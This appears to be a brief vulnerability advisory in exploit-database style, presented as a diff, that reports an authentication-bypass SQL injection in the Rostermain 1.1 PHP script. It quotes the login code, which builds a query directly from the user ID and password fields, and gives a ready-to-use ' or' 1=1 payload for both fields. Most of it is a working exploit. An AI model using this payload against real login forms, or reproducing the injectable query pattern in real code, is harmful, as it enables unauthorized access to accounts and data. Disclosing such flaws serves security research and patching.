@@ -1,0 +1,20 @@
+[+] Rostermain <= 1.1 (Auth Bypass) SQL Injection Vulnerability
+[+] Discovered by cr4wl3r <cr4wl3r[!]linuxmail.org>
+[+] Download : http://scripts.ringsworld.com/games-and-entertainment/rostermain/
+
+
+[+] Vuln Code : 
+
+[index.php]
+
+if ($_POST['userid'] && $_POST['password'])
+{
+  // if the user has just tried to log in
+  $logquery = "select * from users "
+           ."where username='$userid' "
+           ." and passwd='$password' ";
+
+[+] PoC : 
+
+username :  ' or' 1=1
+password :  ' or' 1=1
